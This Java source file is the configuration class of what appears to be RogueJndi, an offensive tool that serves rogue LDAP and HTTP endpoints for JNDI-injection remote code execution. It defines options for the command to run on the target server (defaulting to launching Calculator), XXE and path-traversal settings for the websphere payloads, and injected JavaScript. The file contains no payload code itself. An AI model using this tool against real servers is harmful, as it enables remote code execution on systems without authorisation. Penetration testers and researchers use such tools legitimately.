package artsploit;

import com.beust.jcommander.JCommander;
import com.beust.jcommander.Parameter;
import com.beust.jcommander.UnixStyleUsageFormatter;

import java.io.BufferedReader;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;


public class Config {

    @Parameter(names = {"-c", "--command"}, description = "Command to execute on the target server", order = 0)
    public static String command = "/Applications/Calculator.app/Contents/MacOS/Calculator";

    @Parameter(names = {"-n", "--hostname"}, description = "Local HTTP server hostname " +
            "(required for remote classloading and websphere payloads)", order = 1)
    public static String hostname;

    static {
        try { //try to get the local hostname by default
            hostname = InetAddress.getLocalHost().getHostAddress();
        } catch (UnknownHostException e) {
            hostname = "127.0.0.1";
        }
    }

    @Parameter(names = {"-l", "--ldapPort"}, description = "Ldap bind port", order = 2)
    public static int ldapPort = 1389;

    @Parameter(names = {"-p", "--httpPort"}, description = "Http bind port", order = 3)
    public static int httpPort = 8000;

    @Parameter(names = {"--wsdl"}, description = "[websphere1 payload option] WSDL file with XXE payload", order = 4)
    public static String wsdl = "/list.wsdl";

    @Parameter(names = {"--localjar"}, description = "[websphere2 payload option] Local jar file to load " +
                    "(this file should be located on the remote server)", order = 5)
    public static String localjar = "../../../../../tmp/jar_cache7808167489549525095.tmp";

    @Parameter(names = {"--jsFile"}, description = "Path to a JavaScript code file" +
                    "(this code will be executed instead of Runtime.getRuntime().exec())", order = 6)
    public static String jsFile = "";

    @Parameter(names = {"-h", "--help"}, help = true, description = "Show this help")
    private static boolean help = false;

    public static void applyCmdArgs(String[] args) {
        //process cmd args
        JCommander jc = JCommander.newBuilder()
                .addObject(new Config())
                .build();
        jc.parse(args);
        jc.setProgramName("java -jar target/RogueJndi-1.0.jar");
        jc.setUsageFormatter(new UnixStyleUsageFormatter(jc));

        if(help) {
            jc.usage(); //if -h specified, show help and exit
            System.exit(0);
        }

        if (Config.jsFile != "") {
            try { //try to read the js file
                Path path = Paths.get(Config.jsFile);
                BufferedReader reader = Files.newBufferedReader(path);
                Config.jsFile = new String(Files.readAllBytes(path)).replace("\"", "\\\"").replace("\n", "");
            } catch(IOException e){
                System.err.println("Could not read --jsFile path, exiting...");
                System.exit(1);
            }
        }
    }
}